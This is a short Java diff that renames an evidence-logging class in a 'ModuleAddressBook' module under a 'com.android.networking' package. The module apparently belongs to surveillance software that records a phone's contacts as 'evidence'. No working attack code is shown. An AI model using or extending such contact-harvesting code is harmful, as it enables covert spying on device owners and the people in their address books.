@@ -11,7 +11,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.module.task.Contact;
 import com.android.networking.module.task.PhoneInfo;
@@ -151,7 +151,7 @@ public class ModuleAddressBook extends BaseModule {
 
 		boolean needToSerialize = false;
 
-		final LogR log = new LogR(EvidenceType.ADDRESSBOOK);
+		final EvidenceReference log = new EvidenceReference(EvidenceType.ADDRESSBOOK);
 		
 		// for every Contact
 		while (iter.hasNext()) {
